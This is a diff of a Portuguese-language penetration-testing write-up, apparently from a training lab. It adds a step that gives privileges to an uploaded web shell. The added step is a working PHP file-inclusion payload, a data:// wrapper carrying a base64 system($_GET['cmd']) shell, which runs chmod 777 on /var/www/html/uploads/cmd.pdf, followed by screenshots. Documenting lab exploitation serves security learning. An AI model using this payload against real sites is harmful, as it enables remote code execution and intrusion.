@@ -75,7 +75,13 @@ comando que envia o prompt de comando .pdf pro site :
 
 - Temos um aprimoramento de CMD.
 
+- Agora vamos dar previlegios a esse cmd com o comando: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/cmd.pdf
 
+- Antes:
+<img width="364" height="117" alt="image" src="https://github.com/user-attachments/assets/8ff534bb-acc2-4de0-ae18-bfdf4858ec9d" />
+
+- depois:
+<img width="374" height="137" alt="image" src="https://github.com/user-attachments/assets/7bdde745-c483-49c8-8099-30cf16501345" />
 
 
 
